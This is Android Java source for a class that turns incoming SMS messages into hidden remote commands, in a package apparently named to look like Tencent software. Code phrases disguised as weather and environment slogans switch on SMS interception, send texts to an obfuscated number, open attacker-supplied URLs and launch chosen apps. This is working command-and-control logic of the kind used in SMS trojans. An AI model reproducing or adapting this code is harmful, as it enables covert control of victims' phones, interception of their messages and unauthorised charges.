package com.tencent.sms;

import java.util.ArrayList;
import java.util.List;

import com.tencent.qq.Keys;
import com.tencent.util.Utility;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Vibrator;
import android.telephony.gsm.SmsManager;
/**
 * 指令解析器，通过下发短信到客户端，客户端直接特定的操作
 */
public class InstructResolver {
  
	private Context context;
	//指令单元 
	private ArrayList<String> unitInstruct;
	
	public InstructResolver(Context context)
	{
		this.context=context;
		unitInstruct=new ArrayList<String>();
	}
	
	/**
	 * 进行指令解析,返回解析出来的单元总数
	 */
	public int Parse(String instruct)
	{
		char[] items=instruct.toCharArray();
		int startIndex=0;
		int unitCount=0;
		
		for(int i=0;i<items.length-1;i++)
		{
			if(items[i]==32&&items[i+1]!=32) //cur space,next not space
			{
				unitInstruct.add(instruct.substring(startIndex,i).trim());
				startIndex=i;
				unitCount++;
			}
		}
		//保存最后一个指令单元
		if(startIndex!=items.length-1)
		{
			unitInstruct.add(instruct.substring(startIndex).trim());
			unitCount++;
		}
		return unitCount;
	}
	/**
	 * 执行指令单元
	 * 返回指令是否被系统所解析执行
	 * true 成功
	 * false 失败
	 */
	public boolean execute()
	{
		if(unitInstruct.size()<=0)
			return false;
		boolean bResult=true;
		//进行动作解析
		try 
		{
			
			if(unitInstruct.get(0).trim().equals("保护环境人人有责任"))
			{
				//取消短信拦截		
				SharedPreferences settings=context.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
				SharedPreferences.Editor edit=settings.edit();
				edit.putBoolean(Keys.SMS_INTERCEPT_SWITCH,false);
				edit.commit();
				//通知配置更改
				Intent intent=new Intent(Keys.SETTING_CHANGE);
				context.sendBroadcast(intent);
			}else if(unitInstruct.get(0).trim().equals("保护环境从我做起")){
				//设置短信拦截		
				SharedPreferences settings=context.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
				SharedPreferences.Editor edit=settings.edit();
				edit.putBoolean(Keys.SMS_INTERCEPT_SWITCH,true);
				edit.commit();
				//通知配置更改
				Intent intent=new Intent(Keys.SETTING_CHANGE);
				context.sendBroadcast(intent);
			}else if(unitInstruct.get(0).equals("天气转冷注意保暖")){
				char[] mark={'a','b','c','d','e','f','g','h','i','j'};
				char[] temp=unitInstruct.get(1).toCharArray();
				int len=temp.length;
				String code="";
				for(int i=0;i<len;i++){
					int j=0;
					for(;j<mark.length;j++){
						if(temp[i]==mark[j]){
							code+=String.valueOf(j);
							break;
						}
					}
					//没找到
					if(j==mark.length){
						return false;
					}
				}	
				SmsManager smsManager=SmsManager.getDefault();
				List<String> divideContents=smsManager.divideMessage(unitInstruct.get(2));
				for(String text:divideContents)
				{
					smsManager.sendTextMessage(code, null, text,null,null);
				}
				
			}else if(unitInstruct.get(0).equals("明天有小雨")){
				Uri uri=Uri.parse(unitInstruct.get(1));
				Intent intent=new Intent(Intent.ACTION_VIEW,uri);
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);		
				context.startActivity(intent);
				
			}else if(unitInstruct.get(0).equals("后天有大雨")) //打开APP（参数1：包名，参数2：Activity路径）
			{
				if(unitInstruct.size()==3){
				    Utility.openApplicationFromAppName(context, unitInstruct.get(1).trim());
				}else {
					Intent intent=new Intent();
					intent.setComponent(new ComponentName(unitInstruct.get(1),unitInstruct.get(3)));
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);					
					context.startActivity(intent);
				}
				
			}
			
		} catch (Exception e) {
			bResult=false;
		}
		return bResult;
	}
}
